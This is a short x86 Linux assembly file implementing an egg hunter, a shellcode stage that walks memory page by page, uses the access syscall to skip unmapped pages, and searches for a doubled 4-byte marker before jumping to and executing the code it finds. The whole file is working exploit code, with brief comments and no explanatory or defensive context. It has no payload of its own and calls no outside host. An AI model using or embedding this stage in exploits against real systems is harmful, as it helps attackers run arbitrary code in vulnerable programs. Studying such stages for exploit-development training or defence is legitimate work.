section .text
    global _start

_start:
    mov ebx, 0x90509050     ; store value of an egg
    xor ecx, ecx
    mul ecx                 ; clear EAX,EDX

j1: or dx, 0xfff

j2: inc edx

    pusha                   ; push all registers
    lea ebx, [edx+4]        ; load address 4 bytes into EBX
    mov al, 0x21
    int 0x80

    cmp al, 0x2f            ; compare if return value is EFAULT
    popa

    jz j1                   ; move to another page

    cmp [edx], ebx          ; check for first egg
    jnz j2                  ; jump if not there

    cmp [edx+4], ebx        ; check for second egg
    jnz j2                  ; jump if not there

    jmp edx                 ; found an egg, execute
